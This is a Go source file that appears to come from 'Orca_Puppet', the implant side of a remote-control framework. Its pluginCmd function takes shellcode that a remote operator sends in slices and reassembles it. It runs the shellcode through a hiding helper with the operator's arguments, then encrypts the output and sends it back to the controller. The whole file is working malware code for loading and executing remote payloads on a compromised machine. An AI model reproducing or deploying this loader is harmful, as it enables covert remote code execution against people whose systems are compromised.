package controller

import (
	"Orca_Puppet/cli/cmdopt/pluginopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/define/hide"
	"Orca_Puppet/tools/crypto"
	"encoding/json"
	"strings"
	"time"
)

func pluginCmd(sendUserId, decData string) {
	// 获取id对应的管道
	m, exist := setchannel.GetFileSliceDataChan(sendUserId)
	if !exist {
		m = make(chan interface{})
		setchannel.AddFileSliceDataChan(sendUserId, m)
	}
	defer setchannel.DeleteFileSliceDataChan(sendUserId)
	// 获取shellcode元信息
	var shellcodeMetaInfo pluginopt.ShellcodeMetaInfo
	err := json.Unmarshal([]byte(decData), &shellcodeMetaInfo)
	if err != nil {
		return
	}
	sliceNum := shellcodeMetaInfo.SliceNum
	args := strings.Split(shellcodeMetaInfo.Params, " ")
	// 循环从管道中获取shellcode元数据并写入
	var shellcode []byte
	for i := 0; i < sliceNum+1; i++ {
		select {
		case metaData := <-m:
			shellcode = append(shellcode, metaData.([]byte)...)
		case <-time.After(3 * time.Second):
			return
		}
	}

	stdOut, stdErr := hide.HideShell(shellcode, args[1:])
	debug.DebugPrint(stdOut)
	if stdErr != "" {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, stdErr)
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "plugin_ret", outputMsg, "")
	}

	outputMsg, _ := crypto.Encrypt([]byte(stdOut), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "plugin_ret", outputMsg, "")
	debug.DebugPrint("the shellcode is loaded and executed successfully")
}
